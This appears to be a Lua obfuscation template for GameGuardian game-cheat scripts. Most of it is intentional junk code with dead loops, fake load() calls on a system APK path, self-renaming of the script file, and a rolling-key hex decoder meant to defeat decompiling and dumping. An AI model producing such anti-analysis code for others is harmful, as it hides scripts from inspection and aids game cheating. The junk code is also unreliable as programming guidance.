for Saria = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _ST_125 = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _ST_125 = _ST_125() _ST_125 = _ST_125nil _ST_125= _ST_125():_ST_125(_ST_125nil)(_ST_125nil*-1).._ST_125nil _ST_125 = _ST_125(_ST_125nil)(_ST_125) _ST_125 = _ST_125(_ST_125nil_ST_125nil)(_ST_125) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _ST_125  ~= nil then _ST_125 = _ (_ST_125nil*nil*nil*-nil) _ST_125 = nil end if _ST_125 == nil then   _ST_125 = {_ST_125(_ST_125*nil)(_ST_125*nil)(nil * 1, 1  << nil), _ST_125*nil} end end local _Erro = {} Saria[''] = T local K = (Saria)(Saria, Saria) K[1] = 1 end while (nil)do;local o={}if (o.o)then if (o.o.o)then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o))))end;end;end if nil ~= nil then _Erro = (-nil)((-nil)[nil] | nil | nil) _Block = _Erro _Block = _Block() while (nil) do _Block() end if _Block ~= nil then do for i = 0,1,0 do _SSTools = _Noob(Noob) _SSTools = _SSToolsnil _SSTools= _Noob(Noob):_SSTools(_SSToolsnil)(_SSToolsnil*-1).._SSToolsnil _SSTools = _SSTools(_SSToolsnil)(_SSTools) end for p = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _ST_125 = {(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)} _ST_125 = _ST_125() _ST_125 = _ST_125nil _ST_125= _ST_125():_ST_125(_ST_125nil)(_ST_125nil*-1).._ST_125nil _ST_125 = _ST_125(_ST_125nil)(_ST_125) if _ST_125  ~= nil then _ST_125 = _ (_ST_125nil*nil) _ST_125 = nil end if _ST_125 == nil then   _ST_125 = {_ST_125(_ST_125*nil)(_ST_125*nil)(nil * 1, 1  << nil), _ST_125*nil} end end local _Erro = {} Saria[''] = T local K = (Saria)(Saria, Saria) K[1] = 1 end
local Saria = {} Saria[''] = Saria local t = (Saria)(Saria, Saria) t[1] = 1 end _ = {_, _(-nil)(-nil)(nil * 3, 0  << nil), -nil} _ = _ (nil) _ = -nil _ = _ (-nil * nil)() _SSTools = _SSTools ( _) _SSTools = {(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)} _SSTools = _Noob(Noob) if _SSTools == nil then _SSTools = {_SSTools(_SSTools*nil)(_SSTools*nil)(nil * 3, 0  << nil), _SSTools*nil} end while _Block ~= _SSTools do if _Erro ~= _SSTools then do _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) end end end end end while _Block ~= nil do _SSTools = nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil end
for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;
while nil ~=nil do;local a = {} a.a = nil,nil,nil,nil if (a.a)then;a.a=(a.a(a)) a.a=(a.a(a))end;end;while (nil)do;local b={} local c={} local d={}if (b.b) then if (b.b.b) then if (b.b.b.b) then if (b.b.b.b.b) then if (c.c) then if (c.c.c) then if (c.c.c.c) then if (d.d) then if (d.d.d) then if (d.d.d.d) then;b.b = (b.b(b)) b.b=(b.b(b.b.b(b.b(b)))) c.c = (c.c(c)) c.c=(c.c(c.c.c(c.c.c.c(c.c.c(c.c(c.c)))))) d.d = (d.d(d.d.d(d.d.d.d(d.d.d(d.d(d.d)))))) local e = {b.b,c.c,d.d} e.e = e[1]..e[2]..e[3] e.i = e.e(e.e(e.e(e.e(e.e(e.e(e.e)))))) end;end;end;end;end;end;end;end;end;end;end;while(nil)do;local w={}if(w.w)then;w.w=(w.w(w))end;end;while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|false|nil|w)(w)end;return(true|false|nil)end;return;end;while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[L] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[H] = X[L] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.Batman.games() zzzzz.fullnick = zzzzz.Batman.Loader() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.partner = zzzzz.No.Partner() end end;while (nil)do;local w={}if (w.w)then if (w.w.w)then;w.w=(w.w(w)) w.w=(w.w(w.w.w(w.w(w))))end;end;end
for i = 1,5 do
local ii = i * i local iii = i / i local iiii = i + i local iiiii = i - i
local _ = i * ii * iii * iiii * iiiii local __ = i / ii / iii / iiii / iiiii local ___ = i + ii + iii + iiii + iiiii local ____ = i - ii - iii - iiii - iiiii local _____ = _ * __ * ___ * ____ / _ / __ / ___ / ____ + _ + __ + ___ + ____ - _ - __ - ___ - ____ local ssenl = load(_____) if load(_____) then ssenl() pcall(ssenl) load(_____)() ssenl().ssenl() else load(_____)  end
end
for i = 1,5 do
local ii = i * i local iii = i / i local iiii = i + i local iiiii = i - i
local _ = i * ii * iii * iiii * iiiii local __ = i / ii / iii / iiii / iiiii local ___ = i + ii + iii + iiii + iiiii local ____ = i - ii - iii - iiii - iiiii local _____ = _ * __ * ___ * ____ / _ / __ / ___ / ____ + _ + __ + ___ + ____ - _ - __ - ___ - ____ local ssenl = load(_____) if load(_____) then ssenl() pcall(ssenl) load(_____)() ssenl().ssenl() else load(_____)  end
end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
for i = 1, 200 do load("/system/priv-app/Settings/Settings.apk") end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
for x =0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil  _  = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _~= nil then   _ = _ (-nil * nil)()  _ = nil end  if _  == nil then  _ = {_, _(-nil)(-nil)(nil * 1, 1  << nil), -nil} end end local x = {} x[''] = x local t = (x)(x, x) t[1] = 1 end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
function ST() local NN = {} local N = {} N.N = {} N.NNN = NN.G() N.NNN = N.NNN:G() N.N[T] = N[G]  end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil end
os.rename(gg.getFile(), gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)))
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
os.rename(gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)), gg.getFile())
 for i = 1, 0 do i(-nil)(-nil)(-nil * 1)(-nil)(-nil)(-nil)(-nil * 1) end 
os.rename(gg.getFile(), gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)))
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
for z = 1, 0 do local _ = {} if _.data ~= nil then break _.data = nil (-nil)((-nil)[nil] | nil | nil) _.n = _._.data._[z] _.g = _.n._[z] _.Batman = _.g._.n[z] _.TEAM = _.Batman._.n[z].data() _[z] = _.TEAM[u]  _[z] = nil _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _ (-nil * nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil * 1, 1<< nil), -nil} end local _ = {} _[''] = _ local x = (_)(_, _) x[1] = 1 end _ = nil _.TEAM = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
os.rename(gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)), gg.getFile())
local GBLQ = string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90))
for i = 1,5 do
local ii = i * i local iii = i / i local iiii = i + i local iiiii = i - i
local _ = i * ii * iii * iiii * iiiii local __ = i / ii / iii / iiii / iiiii local ___ = i + ii + iii + iiii + iiiii local ____ = i - ii - iii - iiii - iiiii local _____ = _ * __ * ___ * ____ / _ / __ / ___ / ____ + _ + __ + ___ + ____ - _ - __ - ___ - ____ local ssenl = load(_____) if load(_____) then ssenl() pcall(ssenl) load(_____)() ssenl().ssenl() else load(_____)  end
end
for i = 1,5 do
local ii = i * i local iii = i / i local iiii = i + i local iiiii = i - i
local _ = i * ii * iii * iiii * iiiii local __ = i / ii / iii / iiii / iiiii local ___ = i + ii + iii + iiii + iiiii local ____ = i - ii - iii - iiii - iiiii local _____ = _ * __ * ___ * ____ / _ / __ / ___ / ____ + _ + __ + ___ + ____ - _ - __ - ___ - ____ local ssenl = load(_____) if load(_____) then ssenl() pcall(ssenl) load(_____)() ssenl().ssenl() else load(_____)  end
end
 while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;local w={102,88,4,56,73}if(w.w)then;w.w=(w.w(w))end;end
while(nil)do;for w=w,w do;local w={102,88,4,56,73}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={102,88,4,56,73}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={102,88,4,56,73}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={102,88,4,56,73}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={102,88,4,56,73}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={102,88,4,56,73}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={102,88,4,56,73}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={102,88,4,56,73}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
for i = 1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {15,3,100,23,98} _ = _() _ = -nil  _  = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _~= nil then   _ = _ (-nil * nil)()  _ = nil end  if _  == nil then  _ = {_, _(-nil)(-nil)(nil * 1, 1  << nil), -nil} end end local j = {15,3,100,23,98} j[''] = j local t = (j)(j, j) t[1] = 1 end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while (nil)do;local o={}if (o.o(o(o.o(o.oo))))then if (o.oo) then oo={} if (oo.o(oo.oo))then;o.o=(o.o(o.o.o(o.oo(oo.o(oo.oo(o.o.o(o.o(o,o)))))))) o={o.o,o.o,o.o,oo.o,oo.oo} p = (nil),(nil)*(nil) o.p = p,p,p,p oo.oo.o = (nil),(nil)..","..o.p..","..(nil)*(nil)/(nil)..",(nil)" _G = {oo.oo.o,_G,oo.oo.o} gg = {oo.oo.o,gg,oo.oo.o} end;end;end;end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end

function b68405f119(encoded)

while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[
  local prime = ADD 
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
   local K, F = ABBB, ACC 
    return (encoded:gsub('%x%x', function(c)
        local L = K % 256
        local H = (K - L) // 256
        local M = H % 27 + 1
        c = tonumber(c, 16)

        local m = ((c - (H + prime) * M) * (2 * M + 1) % 256)
        K = (L * F + H + c + m) % (prime * 256)
        return string.char(m)
    end))
end

